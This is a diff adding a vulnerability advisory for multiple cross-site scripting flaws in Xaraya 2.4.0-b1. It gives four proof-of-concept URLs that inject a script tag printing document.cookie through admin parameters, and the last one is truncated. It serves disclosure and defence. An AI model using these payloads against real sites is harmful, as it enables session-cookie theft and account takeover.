@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/60795/info
+
+Xaraya is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Xaraya 2.4.0-b1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php?func=modinfonew&id=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&module=modules&type=admin
+
+http://www.example.com/index.php?block_id=7&func=modify_instance&interface=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&module=blocks&tab=config&type=admin
+
+http://www.example.com/index.php?func=aliases&module=modules&name=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&type=admin
+
+http://www.example.com/index.php?func=assignprivileges&module=privileges&tab=authsystem&tabmodule=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3 
